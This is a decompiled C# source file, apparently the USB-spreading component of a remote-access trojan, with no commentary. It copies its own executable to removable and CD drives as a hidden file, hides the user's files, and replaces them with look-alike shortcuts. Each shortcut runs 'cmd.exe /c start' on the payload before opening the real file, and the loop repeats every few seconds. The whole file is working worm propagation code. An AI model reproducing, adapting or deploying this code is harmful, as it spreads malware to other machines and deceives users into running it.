namespace w
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using Microsoft.Win32;
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Threading;
    using System.Windows.Forms;

    public class GClass2
    {
        public object object_0 = new Collection();
        public object object_1;
        private object object_2 = null;
        private object object_3 = 0;

        public string method_0(string string_0)
        {
            string str;
            try
            {
                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Software\Classes\", false);
                string str2 = Conversions.ToString(key.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(key.OpenSubKey(string_0, false).GetValue(""), @"\DefaultIcon\"))).GetValue("", ""));
                if (!str2.Contains(","))
                {
                    str2 = str2 + ",0";
                }
                str = str2;
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                str = "";
                ProjectData.ClearProjectError();
            }
            return str;
        }

        public object method_1(DriveInfo driveInfo_0, string string_0, string string_1)
        {
            object obj2;
            try
            {
                File.Delete(driveInfo_0.Name + new FileInfo(string_0).Name + ".lnk");
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            object instance = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell", ""), null, "CreateShortcut", new object[] { driveInfo_0.Name + new FileInfo(string_0).Name + ".lnk" }, null, null, null);
            NewLateBinding.LateSetComplex(instance, null, "TargetPath", new object[] { "cmd.exe" }, null, null, false, true);
            NewLateBinding.LateSetComplex(instance, null, "WorkingDirectory", new object[] { "" }, null, null, false, true);
            NewLateBinding.LateSetComplex(instance, null, "Arguments", new object[] { "/c start " + this.object_1.Replace(" ", "\" \"") + "&explorer /root,\"%CD%" + new DirectoryInfo(string_0).Name + "\" & exit" }, null, null, false, true);
            NewLateBinding.LateSetComplex(instance, null, "IconLocation", new object[] { string_1 }, null, null, false, true);
            NewLateBinding.LateCall(instance, null, "Save", new object[0], null, null, null, true);
            instance = null;
            return obj2;
        }

        public void method_2()
        {
            this.object_2 = null;
            this.method_3();
            this.object_2 = Thread.CurrentThread;
            this.object_3 = 0;
            while (true)
            {
                if (this.object_3 != null)
                {
                    break;
                }
                try
                {
                    foreach (DriveInfo info in DriveInfo.GetDrives())
                    {
                        DRV drv;
                        if (!this.object_0.Contains(info.Name.ToLower()))
                        {
                            drv = new DRV {
                                drive = info.Name
                            };
                            this.object_0.Add(drv, info.Name.ToLower(), null, null);
                        }
                        else
                        {
                            drv = (DRV) this.object_0[info.Name.ToLower()];
                        }
                        if (this.object_3 != null)
                        {
                            break;
                        }
                        try
                        {
                            if (info.IsReady && (((info.TotalFreeSpace > 0L) & (info.DriveType == DriveType.Removable)) | (info.DriveType == DriveType.CDRom)))
                            {
                                try
                                {
                                    if (!File.Exists(info.Name + ((string) this.object_1)))
                                    {
                                        File.Copy(Application.ExecutablePath, info.Name + ((string) this.object_1), true);
                                        File.SetAttributes(info.Name + ((string) this.object_1), FileAttributes.Hidden);
                                    }
                                    foreach (string str in Directory.GetFiles(info.Name))
                                    {
                                        if ((Path.GetExtension(str).ToLower() != ".lnk") & (str.ToLower() != (info.Name.ToLower() + this.object_1.ToLower())))
                                        {
                                            if (!drv.Files.Contains(new FileInfo(str).Name))
                                            {
                                                if (drv.Files.Count < 20)
                                                {
                                                    this.method_1(info, str, this.method_0(Path.GetExtension(str)));
                                                    drv.Files.Add(new FileInfo(str).Name);
                                                    File.SetAttributes(str, FileAttributes.Hidden);
                                                    drv.lnk.Add(File.ReadAllText(info.Name + new FileInfo(str).Name + ".lnk"));
                                                }
                                            }
                                            else if (drv.Files.Contains(new FileInfo(str).Name))
                                            {
                                                if (File.GetAttributes(str) != FileAttributes.Hidden)
                                                {
                                                    File.SetAttributes(str, FileAttributes.Hidden);
                                                }
                                                if (!File.Exists(info.Name + new FileInfo(str).Name + ".lnk"))
                                                {
                                                    this.method_1(info, str, this.method_0(Path.GetExtension(str)));
                                                }
                                                else if (File.ReadAllText(info.Name + new FileInfo(str).Name + ".lnk") != drv.lnk[drv.Files.IndexOf(new FileInfo(str).Name)])
                                                {
                                                    this.method_1(info, str, this.method_0(Path.GetExtension(str)));
                                                }
                                            }
                                        }
                                    }
                                }
                                catch (Exception exception1)
                                {
                                    ProjectData.SetProjectError(exception1);
                                    ProjectData.ClearProjectError();
                                }
                            }
                        }
                        catch (Exception exception4)
                        {
                            ProjectData.SetProjectError(exception4);
                            ProjectData.ClearProjectError();
                        }
                    }
                }
                catch (Exception exception5)
                {
                    ProjectData.SetProjectError(exception5);
                    ProjectData.ClearProjectError();
                }
                Thread.Sleep(0xbb8);
            }
            this.object_2 = null;
        }

        public void method_3()
        {
            this.object_3 = 1;
            while (this.object_2 != null)
            {
                Thread.Sleep(1);
            }
            foreach (DriveInfo info in DriveInfo.GetDrives())
            {
                try
                {
                    if (info.IsReady && ((info.DriveType == DriveType.Removable) | (info.DriveType == DriveType.CDRom)))
                    {
                        if (File.Exists(info.Name + ((string) this.object_1)))
                        {
                            File.SetAttributes(info.Name + ((string) this.object_1), FileAttributes.Normal);
                            File.Delete(info.Name + ((string) this.object_1));
                        }
                        string[] files = Directory.GetFiles(info.Name);
                        int index = 0;
                        while (true)
                        {
                            if (index >= files.Length)
                            {
                                break;
                            }
                            string path = files[index];
                            try
                            {
                                File.SetAttributes(path, FileAttributes.Normal);
                                if (path.ToLower().EndsWith(".lnk"))
                                {
                                    File.Delete(path);
                                }
                            }
                            catch (Exception exception1)
                            {
                                ProjectData.SetProjectError(exception1);
                                ProjectData.ClearProjectError();
                            }
                            index++;
                        }
                        foreach (string str2 in Directory.GetDirectories(info.Name))
                        {
                            try
                            {
                                DirectoryInfo info2 = new DirectoryInfo(str2) {
                                    Attributes = FileAttributes.Normal
                                };
                                info2 = null;
                            }
                            catch (Exception exception4)
                            {
                                ProjectData.SetProjectError(exception4);
                                ProjectData.ClearProjectError();
                            }
                        }
                    }
                }
                catch (Exception exception5)
                {
                    ProjectData.SetProjectError(exception5);
                    ProjectData.ClearProjectError();
                }
            }
        }

        public void method_4()
        {
            if (this.object_2 == null)
            {
                this.object_2 = new Thread(new ThreadStart(this.method_2), 1);
                this.object_2.Start();
            }
        }

        public class DRV
        {
            public string drive;
            public List<string> Files = new List<string>();
            public List<string> lnk = new List<string>();
        }
    }
}

